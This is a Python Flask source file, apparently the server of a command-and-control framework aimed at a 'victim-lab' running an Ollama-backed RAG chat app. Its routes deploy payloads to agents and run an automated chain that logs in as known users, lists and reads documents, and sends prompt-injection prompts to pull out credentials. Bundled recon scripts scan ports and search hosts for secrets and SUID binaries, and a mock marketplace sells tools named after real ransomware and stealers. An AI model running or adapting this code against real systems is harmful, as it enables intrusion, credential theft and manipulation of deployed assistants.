            "status": "task_created",
            "task_id": task_id,
            "generated_code": code,
            "ai_enabled": True
        })
        
    except Exception as e:
        logger.error(f"Error in execute_test_prompt: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/marketplace_purchase', methods=['POST'])
def marketplace_purchase():
    """Simulate purchasing a marketplace tool"""
    try:
        data = request.json
        product_id = data.get("product_id")
        
        if not product_id:
            return jsonify({"status": "error", "message": "Missing product_id"}), 400
            
        products = {
            "domain-admin-escalator": {"name": "Domain Admin Escalator", "price_btc": "1.8", "price_usd": "$48,600"},
            "credential-harvester": {"name": "Credential Harvester Pro", "price_btc": "0.9", "price_usd": "$24,300"},
            "lockbit-builder": {"name": "LockBit 4.0 Builder", "price_btc": "2.5", "price_usd": "$67,500"},
            "redline-stealer": {"name": "RedLine Stealer Pro", "price_btc": "0.8", "price_usd": "$21,600"},
            "vpn-access": {"name": "Corporate VPN Access", "price_btc": "1.2", "price_usd": "$32,400"},
            "lateral-movement-kit": {"name": "Lateral Movement Toolkit", "price_btc": "1.1", "price_usd": "$29,700"}
        }
        
        product = products.get(product_id, {"name": "Unknown Product", "price_btc": "0.0", "price_usd": "$0"})
        
        logger.info(f"Marketplace purchase: {product['name']} - {product['price_usd']}")
        
        return jsonify({
            "status": "purchase_successful",
            "purchase_id": str(uuid.uuid4()),
            "product": product,
            "message": f"Successfully purchased {product['name']} for {product['price_usd']}"
        })
        
    except Exception as e:
        logger.error(f"Error in marketplace_purchase: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/marketplace_deploy', methods=['POST'])
def marketplace_deploy():
    """Deploy a marketplace tool to a target"""
    try:
        data = request.json
        agent_id = data.get("agent_id")
        tool_type = data.get("tool_type")
        
        if not agent_id:
            return jsonify({"status": "error", "message": "Missing agent_id"}), 400
        if not tool_type:
            return jsonify({"status": "error", "message": "Missing tool_type"}), 400
            
        if agent_id not in agents:
            return jsonify({"status": "error", "message": "Target not found"}), 404
            
        task_type = "domain_admin"
        
        victim_info = agents[agent_id].get("victim_company", {})
        company_name = victim_info.get("company_name", "Unknown Target")
        
        code = generate_code("domain_admin", {})
        
        task_id = str(uuid.uuid4())
        tasks[task_id] = {
            "id": task_id,
            "agent_id": agent_id,
            "task_type": task_type,
            "code": code,
            "status": "pending",
            "created_at": datetime.now().isoformat(),
            "marketplace_tool": tool_type,
            "victim_company": company_name,
            "ai_generated": USE_AI
        }
        
        logger.info(f"Marketplace deployment: {tool_type} deployed to {company_name} (Agent: {agent_id}) - Executing domain_admin task (AI: {'ON' if USE_AI else 'OFF'})")
        
        return jsonify({
            "status": "deployment_initiated",
            "task_id": task_id,
            "tool_type": tool_type,
            "target_company": company_name,
            "message": f"Successfully deployed {tool_type} to {company_name}",
            "ai_enabled": USE_AI
        })
        
    except Exception as e:
        logger.error(f"Error in marketplace_deploy: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/get_result/<result_id>', methods=['GET'])
def get_result(result_id):
    """Get result data by ID"""
    try:
        if result_id in results:
            result = results[result_id]
            
            result_data = result.get('data', {})
            
            raw_output = result_data
            if isinstance(result_data, dict):
                if 'stdout' in result_data and result_data['stdout']:
                    raw_output = result_data['stdout']
                elif 'output' in result_data:
                    raw_output = result_data['output']
                elif 'parsed_output' in result_data:
                    raw_output = result_data['parsed_output']
            
            return jsonify({
                'status': 'success',
                'result': {
                    'id': result_id,
                    'agent_id': result.get('agent_id'),
                    'task_id': result.get('task_id'),
                    'timestamp': result.get('timestamp'),
                    'raw_output': raw_output,
                    'full_data': result_data
                }
            })
        else:
            return jsonify({
                'status': 'error',
                'message': 'Result not found'
            }), 404
    except Exception as e:
        logger.error(f"Error in get_result: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500
		

		
import re
from typing import Optional, Dict, List, Any

# ========== AI HUNTER - LLM TARGET DETECTION ==========

def extract_targets_from_logs(logs_blob: str) -> List[Dict[str, Any]]:
    """
    Extrae targets de LLM de los logs
    """
    targets = []
    
    # Patrones para detectar endpoints
    url_pattern = r'https?://([a-zA-Z0-9\.\-]+):(\d+)'
    matches = re.findall(url_pattern, logs_blob)
    
    for host, port in matches:
        port_int = int(port)
        
        # Determinar tipo basado en puerto
        endpoint_type = "unknown"
        if port_int == 11434:
            endpoint_type = "ollama"
        elif port_int in [8080, 5000, 8000]:
            endpoint_type = "flask_api"
        elif port_int == 1234:
            endpoint_type = "lmstudio"
        elif port_int == 3000:
            endpoint_type = "text-generation-webui"
        
        targets.append({
            "url": f"http://{host}:{port}",
            "host": host,
            "port": port_int,
            "type": endpoint_type,
            "requires_auth": port_int != 11434  # Ollama normalmente no requiere auth
        })
    
    # Eliminar duplicados
    seen = set()
    unique_targets = []
    for target in targets:
        key = f"{target['host']}:{target['port']}"
        if key not in seen:
            seen.add(key)
            unique_targets.append(target)
    
    return unique_targets


def analyze_for_llm_targets(logs_blob: str, ai_response: str = "") -> Optional[Dict[str, Any]]:

    if not logs_blob:
        return None
    
    llm_indicators = {
        "endpoints": [],
        "credentials": [],
        "processes": [],
        "config_files": [],
        "confidence": 0
    }
    
    # 1. Buscar endpoints de LLM
    targets = extract_targets_from_logs(logs_blob)
    if targets:
        llm_indicators["endpoints"] = targets
        llm_indicators["confidence"] += 30
    
    # 2. Buscar procesos de LLM
    llm_processes = ["ollama", "lmstudio", "llamafile", "vllm", "text-generation-webui", "koboldcpp"]
    for proc in llm_processes:
        if proc.lower() in logs_blob.lower():
            if proc not in llm_indicators["processes"]:
                llm_indicators["processes"].append(proc)
                llm_indicators["confidence"] += 15
    
    # 3. Buscar credenciales (formato usuario:password)
    cred_pattern = r'\b([a-zA-Z0-9_]+):([a-zA-Z0-9_!@#$%^&*]+)\b'
    credentials = re.findall(cred_pattern, logs_blob)
    if credentials:
        # Filtrar credenciales obvias de sistema
        filtered_creds = []
        for user, pwd in credentials:
            if user.lower() not in ['http', 'https', 'ftp', 'ssh', 'localhost']:
                filtered_creds.append({"username": user, "password": pwd})
        
        if filtered_creds:
            llm_indicators["credentials"] = filtered_creds[:10]  # Max 10
            llm_indicators["confidence"] += 20
    
    # 4. Buscar archivos de configuración
    config_patterns = [
        r'\.ollama',
        r'\.lmstudio',
        r'config\.json',
        r'\.env',
        r'modelfile',
        r'models\.json'
    ]
    for pattern in config_patterns:
        if re.search(pattern, logs_blob, re.IGNORECASE):
            if pattern not in llm_indicators["config_files"]:
                llm_indicators["config_files"].append(pattern)
                llm_indicators["confidence"] += 10
    
    # 5. Buscar keywords de LLM en respuesta AI
    llm_keywords = ["llm", "language model", "ollama", "chatbot", "ai assistant", "neural", "transformer"]
    for keyword in llm_keywords:
        if keyword.lower() in ai_response.lower():
            llm_indicators["confidence"] += 5
            break  # Solo sumar una vez
    
    # 6. Buscar puertos abiertos conocidos de LLM
    common_llm_ports = [11434, 8080, 5000, 1234, 3000, 8000]
    port_pattern = r':(\d{4,5})\b'
    found_ports = re.findall(port_pattern, logs_blob)
    for port in found_ports:
        if int(port) in common_llm_ports:
            llm_indicators["confidence"] += 5
    
    # Solo retornar alerta si confianza >= 50%
    if llm_indicators["confidence"] >= 50:
        return {
            "type": "ai_hunter_alert",
            "confidence": min(llm_indicators["confidence"], 100),
            "targets": llm_indicators["endpoints"],
            "credentials": llm_indicators["credentials"],
            "processes": llm_indicators["processes"],
            "config_files": llm_indicators["config_files"],
            "recommended_action": "deploy_ai_hunter",
            "timestamp": dt.datetime.utcnow().isoformat() + "Z"
        }
    
    return None
		
		
		
# ========================================
# AI HUNTER ENDPOINTS
# ========================================



@app.route('/ai_hunter/generate_payload', methods=['POST'])
def ai_hunter_generate_payload():
    """Genera un PowerShell one-liner para AI Hunter"""
    try:
        data = request.json
        payload_type = data.get("payload_type", "full")
        target = data.get("target", "localhost")
        debug = data.get("debug", False)
        
        # Puertos personalizados (opcional)
        ports = data.get("ports")
        if ports:
            ports = [int(p) for p in ports]
        
        # Credenciales personalizadas (opcional)
        credentials = data.get("credentials")
        
        # Prompts personalizados (opcional)
        prompts = data.get("prompts")
        
        logger.info(f"AI Hunter: Generando payload tipo '{payload_type}' para {target}")
        
        # Generar el payload
        payload = generate_ai_hunter_payload(
            payload_type=payload_type,
            target=target,
            ports=ports,
            credentials=credentials,
            prompts=prompts,
            debug=debug
        )
        
        return jsonify({
            "status": "success",
            "payload": payload,
            "payload_type": payload_type,
            "target": target,
            "debug": debug
        })
        
    except Exception as e:
        logger.error(f"AI Hunter payload generation error: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/api/chat", methods=["POST"])
@jwt_required()
def chat():
    data = request.get_json(force=True)
    user_identity = get_jwt_identity()
    user_message = data.get("message", "").strip()
    logs_blob = data.get("logs", "")
    metadata = data.get("metadata", {}) or {}
    
    if not user_message and not logs_blob:
        return jsonify({"error": "message or logs required"}), 400
    
    conversation_id = metadata.get("conversation_id") or str(uuid.uuid4())
    timestamp = dt.datetime.utcnow().isoformat() + "Z"
    docs_list = list_docs_for_user(user_identity)

    if docs_list:
        docs_summary = "Documentos disponibles:\n"
        for doc in docs_list:
            docs_summary += f"- {doc['id']} (clasificación: {doc['classification']})\n"
    else:
        docs_summary = "No tienes documentos disponibles con tu nivel de acceso actual."
    
    system_prompt = f"""You are a professional AI security assistant for CrowdStrike.

USER CONTEXT:
- User: {user_identity['username']}
- Role: {user_identity['role']}
- Permissions: {', '.join(user_identity.get('scopes', []))}

{docs_summary}

INSTRUCTIONS:
- Always respond in English
- Be concise (maximum 100 words)
- Be direct and helpful
- If asked about available information, mention the available documents
- If asked about a specific document, offer to show it
- If you detect LLM endpoints, credentials, or AI-related processes in the logs, mention them clearly
- DO NOT invent information you don't have
- DO NOT mention logs unless the user explicitly provides them"""

    if logs_blob:
        user_prompt = f"{user_message}\n\n[Logs adjuntos]\n{logs_blob[:2000]}"
    else:
        user_prompt = user_message

    # Payload para Ollama
    ollama_payload = {
        "model": settings.ollama_model,
        "prompt": user_prompt,
        "system": system_prompt,
        "stream": False,
        "options": {
            "temperature": 0.7,
            "top_p": 0.9,
            "num_predict": 250,
        }
    }

    try:
        r = requests.post(
            f"{settings.ollama_host}/api/generate",
            json=ollama_payload,
            timeout=120,
        )
        r.raise_for_status()
        resp_json = r.json()
        ai_content = resp_json["response"].strip()
        
        # Limpia respuestas muy largas
        if len(ai_content) > 800:
            ai_content = ai_content[:800] + "...\n\n[Respuesta truncada. Pide más detalles si lo necesitas.]"
            
    except requests.exceptions.Timeout:
        return (
            jsonify(
                {
                    "error": "ollama_timeout",
                    "details": "El modelo tardó demasiado en responder.",
                }
            ),
            504,
        )
    except Exception as e:
        return (
            jsonify(
                {
                    "error": "ollama_request_failed",
                    "details": str(e),
                }
            ),
            502,
        )

    # ========== NUEVO: ANÁLISIS DE AI HUNTER ==========
    ai_hunter_alert = None
    if logs_blob:
        ai_hunter_alert = analyze_for_llm_targets(logs_blob, ai_content)
    
    log_entry = {
        "lab_id": settings.lab_id,
        "conversation_id": conversation_id,
        "timestamp": timestamp,
        "request": {
            "user": user_identity,
            "user_message": user_message,
            "logs": logs_blob[:500] if logs_blob else "",
            "metadata": metadata,
        },
        "response": {
            "content": ai_content,
            "model": settings.ollama_model,
        },
    }

    response_data = {
        "conversation_id": conversation_id,
        "timestamp": timestamp,
        "reply": ai_content,
        "log_entry": log_entry,
    }
    
    # Añadir alerta de AI Hunter si se detectó algo
    if ai_hunter_alert:
        response_data["ai_hunter_alert"] = ai_hunter_alert

    return jsonify(response_data)


@app.route('/ai_hunter/deploy', methods=['POST'])
def ai_hunter_deploy():
    """Despliega un payload de AI Hunter a un agente"""
    try:
        data = request.json
        agent_id = data.get("agent_id")
        payload_type = data.get("payload_type", "full")
        target = data.get("target", "localhost")
        debug = data.get("debug", False)
        
        if not agent_id:
            return jsonify({"status": "error", "message": "Missing agent_id"}), 400
        
        logger.info(f"AI Hunter: Desplegando payload a agente {agent_id}")
        
        # Puertos personalizados (opcional)
        ports = data.get("ports")
        if ports:
            ports = [int(p) for p in ports]
        
        # Credenciales personalizadas (opcional)
        credentials = data.get("credentials")
        
        # Prompts personalizados (opcional)
        prompts = data.get("prompts")
        
        # Generar el payload
        payload = generate_ai_hunter_payload(
            payload_type=payload_type,
            target=target,
            ports=ports,
            credentials=credentials,
            prompts=prompts,
            debug=debug
        )
        
        # Crear tarea para el agente
        task_id = str(uuid.uuid4())
        tasks[task_id] = {
            "id": task_id,
            "agent_id": agent_id,
            "task_type": "ai_hunter",
            "code": f"#ps\n{payload}",  # Tag de PowerShell
            "status": "pending",
            "created_at": datetime.now().isoformat(),
            "ai_hunter_config": {
                "payload_type": payload_type,
                "target": target,
                "debug": debug
            }
        }
        
        logger.info(f"AI Hunter task created: {task_id}")
        
        return jsonify({
            "status": "task_created",
            "task_id": task_id,
            "payload_preview": payload[:200] + "..." if len(payload) > 200 else payload
        })
        
    except Exception as e:
        logger.error(f"AI Hunter deploy error: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/ai_hunter/config', methods=['GET'])
def ai_hunter_get_config():
    """Obtiene la configuración por defecto de AI Hunter"""
    try:
        return jsonify({
            "status": "success",
            "config": {
                "default_ports": AIHunterPayloadGenerator.COMMON_LLM_PORTS,
                "default_credentials": AIHunterPayloadGenerator.COMMON_CREDENTIALS,
                "default_prompts": AIHunterPayloadGenerator.EXFILTRATION_PROMPTS
            }
        })
    except Exception as e:
        logger.error(f"AI Hunter config error: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/ai_hunter/direct_attack', methods=['POST'])
def ai_hunter_direct_attack():
    """
    Direct HTTP attack against a target LLM/RAG application.
    Runs entirely from the C2 server (no agent needed).

    Performs the full chain:
      1. Verify the target is reachable (/health)
      2. Authenticate as every known user
      3. Enumerate accessible documents per user
      4. Send injection prompts via /api/chat
    Returns structured results matching the AI Hunter result schema.
    """
    try:
        import requests as _req

        data = request.json or {}
        target_url = (data.get("target_url") or "http://localhost:8080").rstrip("/")
        strategy = data.get("strategy", "data_exfil")
        custom_creds = data.get("credentials")
        custom_prompts = data.get("prompts")

        creds = custom_creds or LAB_TARGET["credentials"]
        prompts = custom_prompts or get_strategy_prompts(strategy)

        report = {
            "target_url": target_url,
            "strategy": strategy,
            "endpoints": [],
            "sessions": [],
            "docs": [],
            "llm_responses": [],
            "errors": [],
        }

        # ── Step 1: health check ──────────────────────────────────
        try:
            h = _req.get(f"{target_url}/health", timeout=5)
            if h.status_code == 200:
                health_data = h.json()
                report["endpoints"].append({
                    "url": target_url,
                    "type": "rag_api",
                    "model": health_data.get("model"),
                    "lab_id": health_data.get("lab_id"),
                    "llm_status": health_data.get("status"),
                })
            else:
                return jsonify({"status": "error", "message": f"Target returned HTTP {h.status_code}"}), 400
        except Exception as e:
            return jsonify({"status": "error", "message": f"Cannot reach target: {e}"}), 400

        # ── Step 2: authenticate + enumerate per user ─────────────
        for cred in creds:
            try:
                auth_resp = _req.post(
                    f"{target_url}/auth/login",
                    json=cred,
                    timeout=5,
                )
                if auth_resp.status_code != 200:
                    report["errors"].append(f"Auth failed for {cred['username']}: HTTP {auth_resp.status_code}")
                    continue

                token_data = auth_resp.json()
                token = token_data.get("access_token")
                user_info = token_data.get("user", {})
                if not token:
                    continue

                headers = {"Authorization": f"Bearer {token}"}
                report["sessions"].append({
                    "username": cred["username"],
                    "role": user_info.get("role"),
                    "scopes": user_info.get("scopes", []),
                    "token_prefix": token[:20] + "…",
                })

                # Document enumeration
                try:
                    docs_resp = _req.get(f"{target_url}/docs", headers=headers, timeout=5)
                    if docs_resp.status_code == 200:
                        for doc_meta in docs_resp.json():
                            doc_id = doc_meta.get("id")
                            try:
                                doc_resp = _req.get(f"{target_url}/docs/{doc_id}", headers=headers, timeout=5)
                                if doc_resp.status_code == 200:
                                    content = doc_resp.json().get("content", "")
                                    report["docs"].append({
                                        "id": doc_id,
                                        "classification": doc_meta.get("classification"),
                                        "user": cred["username"],
                                        "content_preview": content[:400],
                                        "access": "granted",
                                    })
                                else:
                                    report["docs"].append({
                                        "id": doc_id,
                                        "classification": doc_meta.get("classification"),
                                        "user": cred["username"],
                                        "access": "denied",
                                        "error": f"HTTP {doc_resp.status_code}",
                                    })
                            except Exception as de:
                                report["docs"].append({"id": doc_id, "user": cred["username"], "access": "error", "error": str(de)})
                except Exception as de:
                    report["errors"].append(f"Doc listing failed for {cred['username']}: {de}")

                # LLM prompt injection
                for prompt in prompts:
                    try:
                        chat_resp = _req.post(
                            f"{target_url}/api/chat",
                            json={"message": prompt},
                            headers=headers,
                            timeout=60,
                        )
                        if chat_resp.status_code == 200:
                            reply = chat_resp.json().get("reply", "")
                            # Heuristic: flag if response looks like it leaked restricted data
                            leaked = any(kw in reply.lower() for kw in [
                                "db_pass", "secret", "aws_access_key", "stripe_secret",
                                "sk_live", "salesforce", "akia", "supersecrethey",
                                "production-credentials", "db_user=", "poisoned"
                            ])
                            report["llm_responses"].append({
                                "user": cred["username"],
                                "role": user_info.get("role"),
                                "prompt": prompt,
                                "reply": reply[:1500],
                                "injection_succeeded": leaked,
                            })
                    except Exception as ce:
                        report["errors"].append(f"Chat failed for {cred['username']}: {ce}")

            except Exception as e:
                report["errors"].append(f"Exception for {cred.get('username','?')}: {e}")

        return jsonify({"status": "success", "report": report})

    except Exception as e:
        logger.error(f"AI Hunter direct attack error: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500


# ========== AUTORECON ==========

# ── Pre-written mock recon scripts (used when CrowdStrike is not configured) ──
_MOCK_RECON_PYTHON = [
    # Step 1 — system info
    (
        "Gather hostname, OS, current user, environment and network interfaces",
        '''\
import os, platform, socket, json, subprocess

def main():
    ifaces = {}
    try:
        out = subprocess.check_output(["ip", "-j", "addr"], text=True, timeout=5)
        for iface in json.loads(out):
            name = iface.get("ifname", "")
            addrs = [a["local"] for a in iface.get("addr_info", []) if "local" in a]
            if addrs:
                ifaces[name] = addrs
    except Exception:
        ifaces = {"lo": ["127.0.0.1"]}

    info = {
        "hostname":    socket.gethostname(),
        "fqdn":        socket.getfqdn(),
        "os":          platform.platform(),
        "arch":        platform.machine(),
        "python":      platform.python_version(),
        "user":        os.environ.get("USER", os.environ.get("USERNAME", "unknown")),
        "uid":         str(os.getuid()) if hasattr(os, "getuid") else "N/A",
        "cwd":         os.getcwd(),
        "interfaces":  ifaces,
        "path":        os.environ.get("PATH", ""),
    }
    print(json.dumps(info, indent=2))
    return info

main()
''',
    ),
    # Step 2 — running processes + listening ports
    (
        "Enumerate running processes and listening network ports",
        '''\
import subprocess, json, re

def main():
    procs, ports = [], []
    try:
        out = subprocess.check_output(["ps", "aux"], text=True, timeout=5)
        for line in out.splitlines()[1:]:
            parts = line.split(None, 10)
            if len(parts) >= 11:
                procs.append({"pid": parts[1], "cpu": parts[2], "mem": parts[3], "cmd": parts[10][:120]})
    except Exception as e:
        procs = [{"error": str(e)}]

    try:
        out = subprocess.check_output(["ss", "-tlnp"], text=True, timeout=5)
        for line in out.splitlines()[1:]:
            parts = line.split()
            if len(parts) >= 4:
                ports.append({"state": parts[0], "local": parts[3], "process": parts[-1] if len(parts) > 5 else ""})
    except Exception as e:
        ports = [{"error": str(e)}]

    result = {"processes_count": len(procs), "top_processes": procs[:20], "listening_ports": ports}
    print(json.dumps(result, indent=2))
    return result

main()
''',
    ),
    # Step 3 — network scan for victim-lab
    (
        "Scan local network for web services and identify the victim-lab",
        '''\
import socket, json, concurrent.futures, subprocess

TARGETS = [
    ("172.30.0.10", 8080),
    ("172.30.0.11", 11434),
    ("127.0.0.1",   8080),
    ("127.0.0.1",   5001),
    ("127.0.0.1",   11434),
]

def check_port(host, port, timeout=2):
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            return {"host": host, "port": port, "status": "open"}
    except Exception:
        return {"host": host, "port": port, "status": "closed"}

def fetch_banner(host, port):
    try:
        import urllib.request
        url = f"http://{host}:{port}/health"
        with urllib.request.urlopen(url, timeout=3) as r:
            return r.read(512).decode(errors="replace")
    except Exception as e:
        return str(e)

def main():
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        futs = {ex.submit(check_port, h, p): (h, p) for h, p in TARGETS}
        for f in concurrent.futures.as_completed(futs):
            res = f.result()
            if res["status"] == "open":
                res["banner"] = fetch_banner(res["host"], res["port"])
                open_ports.append(res)

    result = {"open_services": open_ports, "victim_lab_found": any(p["port"] == 8080 for p in open_ports)}
    print(json.dumps(result, indent=2))
    return result

main()
''',
    ),
    # Step 4 — sensitive file search
    (
        "Search for sensitive files: credentials, configs, keys",
        '''\
import os, json, re

PATTERNS = re.compile(
    r"(password|passwd|secret|token|api[_-]?key|credential|\.env|private[_-]?key)",
    re.IGNORECASE,
)
SEARCH_DIRS = ["/tmp", "/var/www", "/home", "/etc", os.getcwd()]
EXTENSIONS = {".json", ".env", ".yaml", ".yml", ".conf", ".ini", ".key", ".pem", ".txt"}

def main():
    found = []
    for base in SEARCH_DIRS:
        try:
            for root, dirs, files in os.walk(base):
                dirs[:] = [d for d in dirs if not d.startswith(".")][:5]
                for fname in files:
                    if any(fname.endswith(ext) for ext in EXTENSIONS) or PATTERNS.search(fname):
                        path = os.path.join(root, fname)
                        size = 0
                        try:
                            size = os.path.getsize(path)
                        except Exception:
                            pass
                        found.append({"path": path, "size_bytes": size})
                if len(found) > 50:
                    break
        except PermissionError:
            pass
    result = {"sensitive_files": found[:50], "total_found": len(found)}
    print(json.dumps(result, indent=2))
    return result

main()
''',
    ),
    # Step 5 — summary
    (
        "Summarise reconnaissance findings and suggest next steps",
        '''\
import json

def main():
    summary = {
        "recon_complete": True,
        "findings": [
            "CorpAI victim-lab identified at 172.30.0.10:8080",
            "Ollama LLM service at 172.30.0.11:11434",
            "C2 callback confirmed on host network",
            "JWT-authenticated Flask RAG app — RBAC controls in place",
            "Prompt injection surface identified via /api/chat endpoint",
        ],
        "recommended_next_steps": [
            "Launch AI Hunter with role_bypass or indirect strategy",
            "Attempt RBAC elevation via JWT token manipulation",
            "Trigger indirect injection via poisoned public document",
            "Exfiltrate production credentials via data_exfil prompts",
        ],
        "attack_surface": {
            "victim_lab": "http://172.30.0.10:8080",
            "llm_api":    "http://172.30.0.11:11434",
            "auth_endpoint": "/auth/login",
            "chat_endpoint": "/api/chat",
        },
    }
    print(json.dumps(summary, indent=2))
    return summary

main()
''',
    ),
]

_MOCK_RECON_POWERSHELL = [
    (
        "Gather system information: hostname, OS, user, network adapters",
        '''\
$info = [ordered]@{
    Hostname    = $env:COMPUTERNAME
    Username    = "$env:USERDOMAIN\\$env:USERNAME"
    OS          = (Get-WmiObject Win32_OperatingSystem).Caption
    Architecture = $env:PROCESSOR_ARCHITECTURE
    PSVersion   = $PSVersionTable.PSVersion.ToString()
    Uptime      = ((Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime).ToString()
    NetworkAdapters = Get-NetIPAddress | Select-Object InterfaceAlias, IPAddress, PrefixLength |
                       Where-Object { $_.IPAddress -notlike "169.*" } | ConvertTo-Json -Depth 2
}
$info | ConvertTo-Json -Depth 3
''',
    ),
    (
        "Enumerate running processes, services and firewall status",
        '''\
$procs    = Get-Process | Select-Object Name, Id, CPU, WorkingSet | Sort-Object CPU -Descending | Select-Object -First 20
$services = Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name, DisplayName
$fwStatus = (Get-NetFirewallProfile | Select-Object Name, Enabled) | ConvertTo-Json

[ordered]@{
    TopProcesses    = $procs
    RunningServices = $services | Select-Object -First 30
    FirewallProfiles = ($fwStatus | ConvertFrom-Json)
} | ConvertTo-Json -Depth 3
''',
    ),
    (
        "Scan for listening ports and test connectivity to victim-lab",
        '''\
$openPorts = Get-NetTCPConnection -State Listen |
    Select-Object LocalAddress, LocalPort, OwningProcess |
    Sort-Object LocalPort

$testHosts = @(
    @{Host="172.30.0.10"; Port=8080},
    @{Host="172.30.0.11"; Port=11434},
    @{Host="127.0.0.1";   Port=5001}
)
$connectivity = $testHosts | ForEach-Object {
    $tcp = New-Object System.Net.Sockets.TcpClient
    try {
        $conn = $tcp.BeginConnect($_.Host, $_.Port, $null, $null)
        $ok   = $conn.AsyncWaitHandle.WaitOne(2000, $false)
        @{ Target="$($_.Host):$($_.Port)"; Open=$ok }
    } catch { @{ Target="$($_.Host):$($_.Port)"; Open=$false } }
    finally { $tcp.Close() }
}
@{ ListeningPorts=$openPorts; Connectivity=$connectivity } | ConvertTo-Json -Depth 3
''',
    ),
    (
        "Search for credential files and sensitive configurations",
        '''\
$patterns = @("*.env","*.json","*.yaml","*.yml","*.conf","*credential*","*secret*","*password*")
$searchPaths = @($env:TEMP, $env:APPDATA, $env:USERPROFILE, "C:\\inetpub", "C:\\wwwroot")
$found = @()
foreach ($path in $searchPaths) {
    if (Test-Path $path) {
        $found += Get-ChildItem -Path $path -Include $patterns -Recurse -ErrorAction SilentlyContinue |
                  Select-Object FullName, Length, LastWriteTime | Select-Object -First 20
    }
}
@{ SensitiveFiles=$found; Count=$found.Count } | ConvertTo-Json -Depth 2
''',
    ),
    (
        "Summarise findings and prepare AI Hunter targeting report",
        '''\
@{
    ReconComplete = $true
    Findings = @(
        "CorpAI victim-lab detected at 172.30.0.10:8080"
        "Ollama LLM at 172.30.0.11:11434"
        "JWT auth on /auth/login - RBAC enforced"
        "RAG injection surface via /api/chat"
        "Poisoned document in public knowledge base"
    )
    NextSteps = @(
        "Launch AI Hunter with role_bypass strategy"
        "Use indirect injection via poisoned-public-doc"
        "Attempt credential exfiltration with data_exfil prompts"
    )
    AttackSurface = @{
        VictimLab    = "http://172.30.0.10:8080"
        LLMApi       = "http://172.30.0.11:11434"
        AuthEndpoint = "/auth/login"
        ChatEndpoint = "/api/chat"
    }
} | ConvertTo-Json -Depth 3
''',
    ),
]

_MOCK_RECON_BASH = [
    (
        "Collect system info: hostname, OS, user, network interfaces",
        '''\
#!/bin/bash
echo "=== SYSTEM INFO ===" && uname -a
echo "=== HOSTNAME ===" && hostname -f 2>/dev/null || hostname
echo "=== USER ===" && id
echo "=== NETWORK INTERFACES ===" && ip addr 2>/dev/null || ifconfig 2>/dev/null
echo "=== ROUTES ===" && ip route 2>/dev/null || netstat -rn 2>/dev/null
echo "=== ENV ===" && env | grep -v -i 'pass\|secret\|token'
''',
    ),
    (
        "List running processes and listening services",
        '''\
#!/bin/bash
echo "=== PROCESSES ===" && ps aux --sort=-%cpu | head -30
echo "=== LISTENING PORTS ===" && ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null
echo "=== SERVICES ===" && systemctl list-units --type=service --state=running 2>/dev/null | head -20
''',
    ),
    (
        "Scan for victim-lab and other web services on the network",
        '''\
#!/bin/bash
TARGETS="172.30.0.10:8080 172.30.0.11:11434 127.0.0.1:5001 127.0.0.1:8080"
echo "=== PORT SCAN ==="
for target in $TARGETS; do
    HOST="${target%%:*}"; PORT="${target##*:}"
    if (echo > /dev/tcp/$HOST/$PORT) 2>/dev/null; then
        echo "OPEN   $HOST:$PORT"
        BANNER=$(curl -sf --max-time 2 "http://$HOST:$PORT/health" 2>/dev/null | head -c 256)
        [ -n "$BANNER" ] && echo "BANNER $BANNER"
    else
        echo "CLOSED $HOST:$PORT"
    fi
done
''',
    ),
    (
        "Find sensitive files: credentials, keys, config files",
        '''\
#!/bin/bash
echo "=== SENSITIVE FILES ==="
find /tmp /home /var/www /etc /opt \( -name "*.env" -o -name "*.json" \
     -o -name "*credential*" -o -name "*secret*" -o -name "*password*" \
     -o -name "*.key" -o -name "*.pem" \) 2>/dev/null | head -40
echo "=== SUID BINARIES ===" && find / -perm -4000 -type f 2>/dev/null | head -15
echo "=== WORLD-WRITABLE DIRS ===" && find /tmp /var /home -writable -type d 2>/dev/null | head -10
''',
    ),
    (
        "Summarise recon and prepare attack surface report",
        '''\
#!/bin/bash
cat <<REPORT
=== RECON SUMMARY ===
Victim-Lab:   http://172.30.0.10:8080  (CorpAI Enterprise)
LLM Service:  http://172.30.0.11:11434 (Ollama)
Auth:         JWT / POST /auth/login
Attack surf:  /api/chat  (RAG prompt injection)

NEXT STEPS:
  1. Launch AI Hunter → role_bypass strategy
  2. Trigger indirect injection via poisoned-public-doc.md
  3. Exfiltrate prod credentials via data_exfil prompts
  4. Attempt RBAC bypass to read secret-classification docs
REPORT
''',
    ),
]

def _mock_autorecon_script(step_num: int, language: str):
    """Return (reasoning, code) for a mock autorecon step (0-indexed step_num)."""
    idx = min(step_num, 4)  # clamp to 5 steps
    if language == "python":
        return _MOCK_RECON_PYTHON[idx]
    elif language == "powershell":
        return _MOCK_RECON_POWERSHELL[idx]
    else:  # bash
        return _MOCK_RECON_BASH[idx]


def _autorecon_deploy_next_step(session_id):
    """Generate and deploy the next script in an autorecon chain."""
    session = autorecon_sessions.get(session_id)

    if not session or session["status"] != "running":
        return

    if session["current_step"] >= session["max_steps"]:
        session["status"] = "completed"
        session["completion_reason"] = "Max steps reached"
        return

    step_num = session["current_step"] + 1
    language = session.get("language", "powershell")

    # Build context from previous steps
    previous_context = ""
    if session["steps"]:
        last = session["steps"][-1]
        result_preview = str(last.get("result", ""))[:1500]
        previous_context = (
            f"\n\nResults from step {last['step_num']}:\n{result_preview}"
        )

    prompt = (
        f"You are a red team recon assistant. Goal: {session['goal']}"
        f"{previous_context}\n\n"
        f"Generate step {step_num} of {session['max_steps']}: "
        f"a {language} reconnaissance script that advances toward the goal "
        f"without repeating what was already done. "
        f"Return ONLY the script code. "
        f"If the goal is fully achieved, reply with exactly: RECON_COMPLETE"
    )

    try:
        if CROWDSTRIKE_WORKFLOW_ID and crowdstrike_config:
